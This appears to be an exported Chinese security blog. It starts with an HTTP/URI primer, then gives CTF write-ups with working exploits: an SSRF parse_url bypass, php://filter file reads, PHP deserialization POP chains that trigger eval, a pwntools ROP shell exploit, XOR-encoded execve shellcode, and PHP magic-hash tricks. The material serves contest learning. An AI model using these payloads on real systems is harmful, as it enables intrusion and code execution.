（原文：http://blog.csdn.net/ergouge/article/details/8185219 ） URI和URL的区别URI，是uniform resource identifier，统一资源标识符，用来唯一的标识一个资源。Web上可用的每种资源如HTML文档、图像、视频片段、程序等都是一个来URI来定位的URI一般由三部组成：①访问资源的命名机制②存放资源的主机名③资源自身的名称，由路径表示，着重强调于资源。 URL是uniform resource locator，统一资源定位器，它是一种具体的URI，即URL可以用来标识一个资源，而且还指明了如何locate这个资源。URL是Internet上用来描述信息资源的字符串，主要用在各种WWW客户程序和服务器程序上，特别是著名的Mosaic。采用URL可以用一种统一的格式来描述各种信息资源，包括文件、服务器的地址和目录等。URL一般由三部组成：①协议(或称为服务方式)②存有该资源的主机IP地址(有时也包括端口号)③主机资源的具体地址。如目录和文件名等 URN，uniform resource name，统一资源命名，是通过名字来标识资源，比如mailto:java-net@java.sun.com。URI是以一种抽象的，高层次概念定义统一资源标识，而URL和URN则是具体的资源标识的方式。URL和URN都是一种URI。笼统地说，每个 URL 都是 URI，但不一定每个 URI 都是 URL。这是因为 URI 还包括一个子类，即统一资源名称 (URN)，它命名资源但不指定如何定位资源。上面的 mailto、news 和 isbn URI 都是 URN 的示例。 在Java的URI中，一个URI实例可以代表绝对的，也可以是相对的，只要它符合URI的语法规则。而URL类则不仅符合语义，还包含了定位该资源的信息，因此它不能是相对的。在Java类库中，URI类不包含任何访问资源的方法，它唯一的作用就是解析。相反的是，URL类可以打开一个到达资源的流。 HTTP之请求消息Request客户端发送一个HTTP请求到服务器的请求消息包括以下格式： 请求行（request line）、请求头部（header）、空行和请求数据四个部分组成。 请求行以一个方法符号开头，以空格分开，后面跟着请求的URI和协议的版本。 Get请求例子，使用Charles抓取的request： GET /562f25980001b1b106000338.jpg HTTP/1.1 Host img.mukewang.com User-Agent Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 Accept image/webp,image/*,*/*;q=0.8 Referer http://www.imooc.com/ Accept-Encoding gzip, deflate, sdch Accept-Language zh-CN,zh;q=0.8 第一部分：请求行，用来说明请求类型,要访问的资源以及所使用的HTTP版本.GET说明请求类型为GET,[/562f25980001b1b106000338.jpg]为要访问的资源，该行的最后一部分说明使用的是HTTP1.1版本。 第二部分：请求头部，紧接着请求行（即第一行）之后的部分，用来说明服务器要使用的附加信息从第二行起为请求头部，HOST将指出请求的目的地.User-Agent,服务器端和客户端脚本都能访问它,它是浏览器类型检测逻辑的重要基础.该信息由你的浏览器来定义,并且在每个请求中自动发送等等 第三部分：空行，请求头部后面的空行是必须的即使第四部分的请求数据为空，也必须有空行。 第四部分：请求数据也叫主体，可以添加任意的其他数据。这个例子的请求数据为空。 POST请求例子，使用Charles抓取的request： POST / HTTP1.1 Host:www.wrox.com User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022) Content-Type:application/x-www-form-urlencoded Content-Length:40 Connection: Keep-Alive name=Professional%20Ajax&amp;publisher=Wiley 第一部分：请求行，第一行明了是post请求，以及http1.1版本。第二部分：请求头部，第二行至第六行。第三部分：空行，第七行的空行。第四部分：请求数据，第八行。 HTTP之响应消息Response一般情况下，服务器接收并处理客户端发过来的请求后会返回一个HTTP的响应消息。 HTTP响应也由四个部分组成，分别是：状态行、消息报头、空行和响应正文。 例子 HTTP/1.1 200 OK Date: Fri, 22 May 2009 06:07:21 GMT Content-Type: text/html; charset=UTF-8 &lt;html&gt; &lt;head&gt;&lt;/head&gt; &lt;body&gt; &lt;!--body goes here--&gt; &lt;/body&gt; &lt;/html&gt; 第一部分：状态行，由HTTP协议版本号， 状态码， 状态消息 三部分组成。第一行为状态行，（HTTP/1.1）表明HTTP版本为1.1版本，状态码为200，状态消息为（ok） 第二部分：消息报头，用来说明客户端要使用的一些附加信息第二行和第三行为消息报头，Date:生成响应的日期和时间；Content-Type:指定了MIME类型的HTML(text/html),编码类型是UTF-8 第三部分：空行，消息报头后面的空行是必须的第四部分：响应正文，服务器返回给客户端的文本信息。空行后面的html部分为响应正文。 HTTP之状态码状态代码有三位数字组成，第一个数字定义了响应的类别，共分五种类别: 1xx：指示信息–表示请求已接收，继续处理 2xx：成功–表示请求已被成功接收、理解、接受 3xx：重定向–要完成请求必须进行更进一步的操作 4xx：客户端错误–请求有语法错误或请求无法实现 5xx：服务器端错误–服务器未能实现合法的请求常见状态码： 200 OK //客户端请求成功 400 Bad Request //客户端请求有语法错误，不能被服务器所理解 401 Unauthorized //请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用 403 Forbidden //服务器收到请求，但是拒绝提供服务 404 Not Found //请求资源不存在，eg：输入了错误的URL 500 Internal Server Error //服务器发生不可预期的错误 503 Server Unavailable //服务器当前不能处理客户端的请求，一段时间后可能恢复正常 更多状态码http://www.runoob.com/http/http-status-codes.html HTTP请求方法根据HTTP标准，HTTP请求可以使用多种请求方法。 HTTP1.0定义了三种请求方法： GET, POST 和 HEAD方法。 HTTP1.1新增了五种请求方法：OPTIONS, PUT, DELETE, TRACE 和 CONNECT 方法。 GET 请求指定的页面信息，并返回实体主体。 HEAD 类似于get请求，只不过返回的响应中没有具体的内容，用于获取报头 POST 向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和/或已有资源的修改。 PUT 从客户端向服务器传送的数据取代指定的文档的内容。 DELETE 请求服务器删除指定的页面。 CONNECT HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。 OPTIONS 允许客户端查看服务器的性能。 TRACE 回显服务器收到的请求，主要用于测试或诊断。 HTTP工作原理HTTP协议定义Web客户端如何从Web服务器请求Web页面，以及服务器如何把Web页面传送给客户端。HTTP协议采用了请求/响应模型。客户端向服务器发送一个请求报文，请求报文包含请求的方法、URL、协议版本、请求头部和请求数据。服务器以一个状态行作为响应，响应的内容包括协议的版本、成功或者错误代码、服务器信息、响应头部和响应数据。 以下是 HTTP 请求/响应的步骤： 1、客户端连接到Web服务器一个HTTP客户端，通常是浏览器，与Web服务器的HTTP端口（默认为80）建立一个TCP套接字连接。例如，http://www.oakcms.cn。 2、发送HTTP请求通过TCP套接字，客户端向Web服务器发送一个文本的请求报文，一个请求报文由请求行、请求头部、空行和请求数据4部分组成。 3、服务器接受请求并返回HTTP响应Web服务器解析请求，定位请求资源。服务器将资源复本写到TCP套接字，由客户端读取。一个响应由状态行、响应头部、空行和响应数据4部分组成。 4、释放连接TCP连接若connection 模式为close，则服务器主动关闭TCP连接，客户端被动关闭连接，释放TCP连接;若connection 模式为keepalive，则该连接会保持一段时间，在该时间内可以继续接收请求; 5、客户端浏览器解析HTML内容客户端浏览器首先解析状态行，查看表明请求是否成功的状态代码。然后解析每一个响应头，响应头告知以下为若干字节的HTML文档和文档的字符集。客户端浏览器读取响应数据HTML，根据HTML的语法对其进行格式化，并在浏览器窗口中显示。 例如：在浏览器地址栏键入URL，按下回车之后会经历以下流程： 1、浏览器向 DNS 服务器请求解析该 URL 中的域名所对应的 IP 地址; 2、解析出 IP 地址后，根据该 IP 地址和默认端口 80，和服务器建立TCP连接; 3、浏览器发出读取文件(URL 中域名后面部分对应的文件)的HTTP 请求，该请求报文作为 TCP 三次握手的第三个报文的数据发送给服务器; 4、服务器对浏览器请求作出响应，并把对应的 html 文本发送给浏览器; 5、释放 TCP连接; 6、浏览器将该 html 文本并显示内容 GET和POST请求的区别GET请求 GET /books/?sex=man&amp;name=Professional HTTP/1.1 Host: www.wrox.com User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6) Gecko/20050225 Firefox/1.0.1 Connection: Keep-Alive 注意最后一行是空行 POST请求 POST / HTTP/1.1 Host: www.wrox.com User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6) Gecko/20050225 Firefox/1.0.1 Content-Type: application/x-www-form-urlencoded Content-Length: 40 Connection: Keep-Alive name=Professional%20Ajax&amp;publisher=Wiley 1、GET提交，请求的数据会附在URL之后（就是把数据放置在HTTP协议头中），以?分割URL和传输数据，多个参数用&amp;连接；例 如：login.action?name=hyddd&amp;password=idontknow&amp;verify=%E4%BD%A0 %E5%A5%BD。如果数据是英文字母/数字，原样发送，如果是空格，转换为+，如果是中文/其他字符，则直接把字符串用BASE64加密，得出如： %E4%BD%A0%E5%A5%BD，其中％XX中的XX为该符号以16进制表示的ASCII。 POST提交：把提交的数据放置在是HTTP包的包体中。上文示例中红色字体标明的就是实际的传输数据 因此，GET提交的数据会在地址栏中显示出来，而POST提交，地址栏不会改变 2、传输数据的大小：首先声明：HTTP协议没有对传输的数据大小进行限制，HTTP协议规范也没有对URL长度进行限制。 而在实际开发中存在的限制主要有： GET:特定浏览器和服务器对URL长度有限制，例如 IE对URL长度的限制是2083字节(2K+35)。对于其他浏览器，如Netscape、FireFox等，理论上没有长度限制，其限制取决于操作系 统的支持。 因此对于GET提交时，传输数据就会受到URL长度的 限制。 POST:由于不是通过URL传值，理论上数据不受 限。但实际各个WEB服务器会规定对post提交数据大小进行限制，Apache、IIS6都有各自的配置。 3、安全性 POST的安全性要比GET的安全性高。比如：通过GET提交数据，用户名和密码将明文出现在URL上，因为(1)登录页面有可能被浏览器缓存；(2)其他人查看浏览器的历史纪录，那么别人就可以拿到你的账号和密码了，除此之外，使用GET提交数据还可能会造成Cross-site request forgery攻击 4、Http get,post,soap协议都是在http上运行的 （1）get：请求参数是作为一个key/value对的序列（查询字符串）附加到URL上的查询字符串的长度受到web浏览器和web服务器的限制（如IE最多支持2048个字符），不适合传输大型数据集同时，它很不安全 （2）post：请求参数是在http标题的一个不同部分（名为entity body）传输的，这一部分用来传输表单信息，因此必须将Content-type设置为:application/x-www-form- urlencoded。post设计用来支持web窗体上的用户字段，其参数也是作为key/value对传输。但是：它不支持复杂数据类型，因为post没有定义传输数据结构的语义和规则。 （3）soap：是http post的一个专用版本，遵循一种特殊的xml消息格式Content-type设置为: text/xml 任何数据都可以xml化。 Http协议定义了很多与服务器交互的方法，最基本的有4种，分别是GET,POST,PUT,DELETE. 一个URL地址用于描述一个网络上的资源，而HTTP中的GET, POST, PUT, DELETE就对应着对这个资源的查，改，增，删4个操作。 我们最常见的就是GET和POST了。GET一般用于获取/查询资源信息，而POST一般用于更新资源信息. 我们看看GET和POST的区别 GET提交的数据会放在URL之后，以?分割URL和传输数据，参数之间以&amp;相连，如EditPosts.aspx?name=test1&amp;id=123456. POST方法是把提交的数据放在HTTP包的Body中. GET提交的数据大小有限制（因为浏览器对URL的长度有限制），而POST方法提交的数据没有限制. GET方式需要使用Request.QueryString来取得变量的值，而POST方式通过Request.Form来获取变量的值。 GET方式提交数据，会带来安全问题，比如一个登录页面，通过GET方式提交数据时，用户名和密码将出现在URL上，如果页面可以被缓存或者其他人可以访问这台机器，就可以从历史记录获得该用户的账号和密码.]]></content>
      <tags>
        <tag>读书心得</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈ssrf绕过]]></title>
    <url>%2F2019%2F02%2F08%2F%E6%B5%85%E8%B0%88ssrf%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[以hgame2019-week2的web为例 php trick 描述some php tricks URL http://118.24.3.214:3001 基准分数 200 当前分数 200 题目源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php//admin.phphighlight_file(__FILE__);$str1 = (string)@$_GET['str1'];$str2 = (string)@$_GET['str2'];$str3 = @$_GET['str3'];$str4 = @$_GET['str4'];$str5 = @$_GET['H_game'];$url = @$_GET['url'];if( $str1 == $str2 )&#123; die('step 1 fail');&#125;if( md5($str1) != md5($str2) )&#123; die('step 2 fail');&#125;if( $str3 == $str4 )&#123; die('step 3 fail');&#125;if ( md5($str3) !== md5($str4))&#123; die('step 4 fail');&#125;if (strpos($_SERVER['QUERY_STRING'], "H_game") !==false) &#123; die('step 5 fail');&#125;if(is_numeric($str5))&#123; die('step 6 fail');&#125;if ($str5&lt;9999999999)&#123; die('step 7 fail');&#125;if ((string)$str5&gt;0)&#123; die('step 8 fial');&#125;if (parse_url($url, PHP_URL_HOST) !== "www.baidu.com")&#123; die('step 9 fail');&#125;if (parse_url($url,PHP_URL_SCHEME) !== "http")&#123; die('step 10 fail');&#125;$ch = curl_init();curl_setopt($ch,CURLOPT_URL,$url);$output = curl_exec($ch);curl_close($ch);if($output === FALSE)&#123; die('step 11 fail');&#125;else&#123; echo $output;&#125; 题目提示admin.php，访问一下 让人联想到ssrf 前面的几个if都是正常绕过 12345678910111213141516if (parse_url($url, PHP_URL_HOST) !== "www.baidu.com")&#123; die('step 9 fail'); &#125; if (parse_url($url,PHP_URL_SCHEME) !== "http")&#123; die('step 10 fail'); &#125; $ch = curl_init(); curl_setopt($ch,CURLOPT_URL,$url); $output = curl_exec($ch); curl_close($ch); if($output === FALSE)&#123; die('step 11 fail'); &#125; else&#123; echo $output; &#125; 这里涉及了parse_url函数的绕过，我们既要访问到本地的admin.php又要保证URL符合www.baidu.com 找到了这篇文章https://www.cnblogs.com/afanti/p/9928371.html 这里可用@进行绕过 http://@127.0.0.1:80@www.baidu.com/admin.php 可以使其访问到admin.php payload: http://118.24.3.214:3001/index.php?str1=s878926199a&amp;str2=s155964671a&amp;str3[]=1&amp;str4[]=2%00&amp;H+game[]=999&amp;url=http://@127.0.0.1:80@www.baidu.com/admin.php 得到了admin的源码 123456789101112131415&lt;?php//flag.phpif($_SERVER['REMOTE_ADDR'] != '127.0.0.1') &#123; die('only localhost can see it');&#125;$filename = $_GET['filename']??'';if (file_exists($filename)) &#123; echo "sorry,you can't see it";&#125;else&#123; echo file_get_contents($filename);&#125;highlight_file(__FILE__);?&gt; 这里源码的意思是这个文件不存在但是还是让我们读取，在这里可以使用php://filter伪协议 最后payload: http://118.24.3.214:3001/index.php?str1=s878926199a&amp;str2=s155964671a&amp;str3[]=1&amp;str4[]=2%00&amp;H+game[]=999&amp;url=http://@127.0.0.1:80@www.baidu.com/admin.php?filename=php://filter/read=convert.base64-encode/resource=flag.php 得到一串base64编码 PD9waHAgJGZsYWcgPSBoZ2FtZXtUaEVyNF9BcjRfczBtNF9QaHBfVHIxY2tzfSA/Pgo= 解密后得到flag]]></content>
      <tags>
        <tag>系统总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安恒杯1月赛wp]]></title>
    <url>%2F2019%2F01%2F31%2F%E5%AE%89%E6%81%92%E6%9D%AF1%E6%9C%88%E8%B5%9Bwp%2F</url>
    <content type="text"><![CDATA[webbabygo题目源码 &lt;?php @error_reporting(1); include &apos;flag.php&apos;; class baby { protected $skyobj; public $aaa; public $bbb; function __construct() { $this-&gt;skyobj = new sec; } function __toString() { if (isset($this-&gt;skyobj)) return $this-&gt;skyobj-&gt;read(); } } class cool { public $filename; public $nice; public $amzing; function read() { $this-&gt;nice = unserialize($this-&gt;amzing); $this-&gt;nice-&gt;aaa = $sth; if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb) { $file = &quot;./{$this-&gt;filename}&quot;; if (file_get_contents($file)) { return file_get_contents($file); } else { return &quot;you must be joking!&quot;; } } } } class sec { function read() { return &quot;it&apos;s so sec~~&quot;; } } if (isset($_GET[&apos;data&apos;])) { $Input_data = unserialize($_GET[&apos;data&apos;]); echo $Input_data; } else { highlight_file(&quot;./index.php&quot;); } ?&gt; 这个和前几天博客讨论的反序列化pop链构造是一样的，直接放上payload &lt;?php @error_reporting(1); include &apos;flag.php&apos;; class baby { protected $skyobj; public $aaa; public $bbb; function __construct() { $this-&gt;skyobj = new cool(); } function __toString() { if (isset($this-&gt;skyobj)) return $this-&gt;skyobj-&gt;read(); } } class cool { public $filename = &apos;flag.php&apos;; public $nice; public $amzing; function read() { $this-&gt;nice = unserialize($this-&gt;amzing); $this-&gt;nice-&gt;aaa = $sth; if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb) { $file = &quot;./{$this-&gt;filename}&quot;; if (file_get_contents($file)) { return file_get_contents($file); } else { return &quot;you must be joking!&quot;; } } } } class sec { function read() { return &quot;it&apos;s so sec~~&quot;; } } $a = new baby(); $a = serialize($a); $a = urlencode($a); echo $a; ?&gt; 得到下面这串字符串： O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3BN%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BN%3B%7D 加入题目进行验证 成功获得flag MISCzhunianjixiang题目是一张图片 用foremost对文件提取，得到两张图片 扫描二维码 提示二维码有古怪 拖到stegsolve后发现flag]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RedHat 2017-pwn1题目复现]]></title>
    <url>%2F2019%2F01%2F30%2FRedHat-2017-pwn1%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[碰到了RedHat 2017 的一道pwn，算是一道很经典的ROP，这里记录一下。 程序只有一个输入点： 检查保护机制： Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 可以看见开启了NX 我们将程序拖进ida中查看： int __cdecl main() { int v1; // [esp+18h] [ebp-28h] puts(&quot;pwn test&quot;); fflush(stdout); __isoc99_scanf(&quot;%s&quot;, &amp;v1); printf(&quot;%s&quot;, &amp;v1); return 1; } 程序流程非常简单，可以看到在scanf函数处存在溢出问题，我们可以使其执行system指令，而在程序中可以找到内置的system指令，但是我们无法在程序中获取到/bin/sh字符串，这里再次利用rop技术，调用scanf函数将/bin/sh字符串读取到程序段中，然后再执行system函数 这里介绍一下神器pwntools的ROP模块的用法，例如： rop.call(&apos;read&apos;, (0, elf.bss(0x80))) 其中 (0, elf.bss(0x80)) 是read函数的参数，即使call的函数参数只有一个，我们也要使用一个元组(参数1，)这样 回到本程序，我们来判断需要填充的字节个数： 我们需要填写52个无用字符 下面编写exp: from pwn import * p = process(&apos;./pwn1&apos;) elf = ELF(&apos;./pwn1&apos;) rop = ROP(&apos;./pwn1&apos;) rop.call(0x08048410,(0x08048629, 0x0804A040)) rop.system(0x0804A040) payload = str(rop) p.sendline(52*&apos;a&apos;+payload) p.sendline(&apos;/bin/sh&apos;) p.interactive() 成功获得shell]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwn之shellcode编写]]></title>
    <url>%2F2019%2F01%2F29%2Fpwn%E4%B9%8Bshellcode%E7%BC%96%E5%86%99%2F</url>
    <content type="text"><![CDATA[这里以前几天碰到的hgame2019的一道pwn题目为例 程序直接就给了输入点，我们拖入到ida查看 这是一个64位程序，我们正常在main函数处f5反编译时出现了报错 我们选中报错那行代码按d，即可正常反编译 int __cdecl main(int argc, const char **argv, const char **envp) { char buf[92]; // [rsp+0h] [rbp-60h] int i; // [rsp+5Ch] [rbp-4h] signal(14, handle); alarm(0xAu); read(0, buf, 0x50uLL); for ( i = 0; i &lt;= 79; ++i ) buf[i] ^= i + 1; JUMPOUT(*(_QWORD *)&amp;byte_400672); } 改程序直接调用了我们输入的shellcode，但是注意在 for ( i = 0; i &lt;= 79; ++i ) buf[i] ^= i + 1; 这里他将我们输入的shellcode和i+1进行了异或，所以我们需要将我们的shellcode与i+1进行异或后再发送给程序 关于shellcode，我们不会编写的话可以去公共数据库寻找合适的shellcode http://shell-storm.org/shellcode/ 这里我使用了一位师傅分享的shellcode 我们先将其与i+1进行异或运算 buf = &quot;\x48\x31\xc0\x48\x83\xc0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xd2\x0f\x05&quot; m = &quot;&quot; for i in range(0,34): m = m+chr(ord(buf[i])^(i+1)) 而后将其整合在最后的exp中： from pwn import * context(os=&apos;linux&apos;, arch=&apos;amd64&apos;, log_level=&apos;debug&apos;) p = remote(&apos;118.24.3.214&apos;,10000) #p = process(&apos;./babysc&apos;) buf = &quot;\x48\x31\xc0\x48\x83\xc0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xd2\x0f\x05&quot; m = &quot;&quot; for i in range(0,34): m = m+chr(ord(buf[i])^(i+1)) p.send(m) p.interactive() 执行后成功获得了权限]]></content>
      <tags>
        <tag>pwn，CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF中常出现的PHP函数]]></title>
    <url>%2F2019%2F01%2F28%2FCTF%E4%B8%AD%E5%B8%B8%E5%87%BA%E7%8E%B0%E7%9A%84PHP%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[文章部分内容来源于网络 strcmpstrcmp(a1，a2)函数用来比较两个字符串是否相等的，比较的是对应字符的ascii码，如果相等返回0，当a1的ascii大于a2的返回小于0，a1的ascii码小于a2的，返回大于0. 但是这个函数是存在漏洞的，我们知道这个函数是用来比较字符串的，但是当我们传入为数组是，那变成字符串和数组进行比较了，因此php在5.2之前，默认返回的-1，5.2版本之后返回0.因此有时我们便可以利用这个漏洞 demo： &lt;?php error_reporting(); $flag=$_GET[&apos;flag&apos;]; if(strcmp(&apos;Waldo_cuit&apos;,$flag)){ echo &apos;NO!&apos;; } else{ echo &apos;YES!&apos;; } ?&gt; eregereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&apos;password&apos;]) === FALSE 字符串对比解析，这里如果$_GET[‘password’]为数组，则返回值为NULL，如果为123 || asd || 12as || 123%00&amp;&amp;&amp;**，则返回值为true is_numericdemo: &lt;?php echo is_numeric(233333); # 1 echo is_numeric(&apos;233333&apos;);# 1 echo is_numeric(0x233333);# 1 echo is_numeric(&apos;0x233333&apos;); # 1 echo is_numeric(&apos;233333abc&apos;); # 0 ?&gt; Intval获取变量的整数值，允许以使用特定的进制返回。默认10进制 注:如果参数为整数，则不做任何处理。 我们可以构造字符串绕过： 当取回字符串整数的时候，如果字符串中含有非数字的字符，将会返回第一次出现非数字符的前面的整数。若果没有数字返回0 parse_str与 parse_str() 类似的函数还有 mb_parse_str()，parse_str 将字符串解析成多个变量，如果参数str是URL传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域。 //var.php?var=new $var=&apos;init&apos;; parse_str($_SERVER[&apos;QUERY_STRING&apos;]); print $var; MD5PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0 常见字符串： QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a sha1(str) sha1(&apos;aaroZmOk&apos;) sha1(&apos;aaK1STfY&apos;) sha1(&apos;aaO8zKZF&apos;) sha1(&apos;aa3OFF9m&apos;) 同时MD5不能处理数组，有以下判断可用数组绕过： if(@md5($_GET[&apos;a&apos;]) == @md5($_GET[&apos;b&apos;])) { echo &quot;yes&quot;; } preg_match如果在进行正则表达式匹配的时候，没有限制字符串的开始和结束(^ 和 $)，则可以存在绕过的问题 &lt;?php $ip = &apos;1.1.1.1 abcd&apos;; // 可以绕过 if(!preg_match(&quot;/(\d+)\.(\d+)\.(\d+)\.(\d+)/&quot;,$ip)) { die(&apos;error&apos;); } else { echo(&apos;key...&apos;); } ?&gt;]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php反序列化pop链的构造]]></title>
    <url>%2F2019%2F01%2F27%2Fphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E7%9A%84%E6%9E%84%E9%80%A0%2F</url>
    <content type="text"><![CDATA[通常反序列化的攻击是在魔术方法中出现一些可利用的漏洞，通过自动调用来触发漏洞。 但是如果关键代码不在魔术方法中，而是在一个类的普通方法中。这个时候我们可以通过寻找相同的函数名将类的属性和敏感函数联系起来 借用网上的代码： &lt;?php class lemon { protected $ClassObj; function __construct() { $this-&gt;ClassObj = new normal(); } function __destruct() { $this-&gt;ClassObj-&gt;action(); } } class normal { function action() { echo &quot;hello&quot;; } } class evil { private $data; function action() { eval($this-&gt;data); } } unserialize($_GET[&apos;d&apos;]); 其中类normal 和 evil同时拥有action方法，并且evil中的方法是可控的，我们可以通过反序列化来掉用evil类中的action方法 exp: &lt;?php class lemon { protected $ClassObj; function __construct() { $this-&gt;ClassObj = new evil(); } function __destruct() { $this-&gt;ClassObj-&gt;action(); } } class normal { function action() { echo &quot;hello&quot;; } } class evil { private $data = &quot;phpinfo();&quot;; function action() { eval($this-&gt;data); } } $a = new lemon(); echo urlencode(serialize($a)); 会生成这样一段payload O%3A5%3A%22lemon%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00ClassObj%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A10%3A%22%00evil%00data%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D 用get方式传入 可以看到成功进行了利用]]></content>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HGAME 2019-week1 writeup]]></title>
    <url>%2F2019%2F01%2F26%2FHGAME-2019-week1-writeup%2F</url>
    <content type="text"><![CDATA[web谁吃了我的flag题目是考察备份文件的恢复，将.index.html.swp下载下来，然后使用命令vim -r index.html即可恢复文件查看到flag 换头大作战在响应头出多次按照提示变换，最后得到flag very easy web题目代码如下 &lt;?php error_reporting(0); include(&quot;flag.php&quot;); if(strpos(&quot;vidar&quot;,$_GET[&apos;id&apos;])!==FALSE) die(&quot;&lt;p&gt;干巴爹&lt;/p&gt;&quot;); $_GET[&apos;id&apos;] = urldecode($_GET[&apos;id&apos;]); if($_GET[&apos;id&apos;] === &quot;vidar&quot;) { echo $flag; } highlight_file(__FILE__); ?&gt; 可以看到在代码中间有这么一句 $_GET[&apos;id&apos;] = urldecode($_GET[&apos;id&apos;]); 将参数进行了URL解码，而我们知道除了这个解码外，浏览器额外还会进行解码，所以我们需要将参数进行两次URL编码，同时自然绕过strpos函数 加密网址：http://web.chacuo.net/charseturlencode can u find me?f12查看源码，发现了f12.php 访问后提示让我们post一个密码，随便post一个密码，可以在返回包中看到真实的密码 输入后再次抓包即可得到flag REHelloRe打开发现是ELF文件，使用strings命令查看字符串发现flag Pro的Python教室(一)代码如下 import base64 import hashlib enc1 = &apos;hgame{&apos; enc2 = &apos;SGVyZV8xc18zYXN5Xw==&apos; enc3 = &apos;Pyth0n}&apos; print &apos;Welcome to Processor\&apos;s Python Classroom!\n&apos; print &apos;Here is Problem One.&apos; print &apos;There\&apos;re three parts of the flag.&apos; print &apos;------------------------------------------------&apos; print &apos;Plz input the first part:&apos; first = raw_input() if first == enc1: pass else: print &apos;Sorry , You\&apos;re so vegatable!&apos; exit() print &apos;Plz input the secend part:&apos; secend = raw_input() secend = base64.b64encode(secend) if secend == enc2: pass else: print &apos;Sorry , You\&apos;re so vegatable!&apos; exit() print &apos;Plz input the third part:&apos; third = raw_input() third = base64.b32decode(third) if third == enc3: pass else: print &apos;Sorry , You\&apos;re so vegatable!&apos; exit() print &apos;Oh, You got it !&apos; 直接将SGVyZV8xc18zYXN5Xw==base64解码后拼接成flag就可以了 PWNaaaaaaaaaa使用IDA打开查看 int __cdecl main(int argc, const char **argv, const char **envp) { signed int v3; // eax signed int v5; // [rsp+Ch] [rbp-4h] setbuf(_bss_start, 0LL); signal(14, handle); alarm(0xAu); puts(&quot;Welcome to PWN&apos;world!let us aaaaaaaaaa!!!&quot;); v5 = 0; while ( 1 ) { v3 = v5++; if ( v3 &gt; 99 ) break; if ( getchar() != 97 ) exit(0); } system(&quot;/bin/sh&quot;); return 0; } 我们发送100个a就可以了 exp: from pwn import * #p = process(&apos;./a&apos;) p = remote(&apos;118.24.3.214&apos;,9999) p.sendlineafter(&apos;!!!&apos;,&apos;a&apos;*100) p.interactive() MISCBroken Chest打开发现压缩包是损坏的，修复一下文件头，然后用注释的字符串作为密码，得到flag Try在流量包中提取到一个压缩包，其中有一passWord文件，提示hgame**，想到掩码攻击，爆破得到密码解压 又得到一张图片，使用foremost分离出Word文件，打开得到flag CRYPTOMIX题目给了以下代码 --.../....-/....-/-.../--.../...--/...../..-./-..../-../-..../..-./--.../----./....-/....-/--.../.----/-..../-.../--.../-.../-..../..---/...../.----/-..../-..../...--/....-/...--/-----/-..../...../--.../-.. 感觉像是摩斯码，将/替换成空格，即可得到flag Base全家手动测试 import base64 import requests url = &quot;http://plir4axuz.bkt.clouddn.com/hgame2019/enc.txt&quot; html = requests.get(url) result = html.text result = base64.b64decode(result) result = base64.b64decode(result) result = base64.b16decode(result) result = base64.b16decode(result) result = base64.b16decode(result) result = base64.b32decode(result) result = base64.b16decode(result) result = base64.b32decode(result) result = base64.b64decode(result) result = base64.b16decode(result) result = base64.b64decode(result) result = base64.b16decode(result) result = base64.b16decode(result) result = base64.b16decode(result) result = base64.b16decode(result) result = base64.b32decode(result) result = base64.b64decode(result) result = base64.b64decode(result) result = base64.b64decode(result) result = base64.b32decode(result) print(result) 得到结果： base58 : 2BAja2VqXoHi9Lo5kfQZBPjq1EmZHGEudM5JyDPREPmS3CxrpB8BnC 在github上搜到了第三方库，下载使用解密即可 https://github.com/keis/base58]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Waf那些事]]></title>
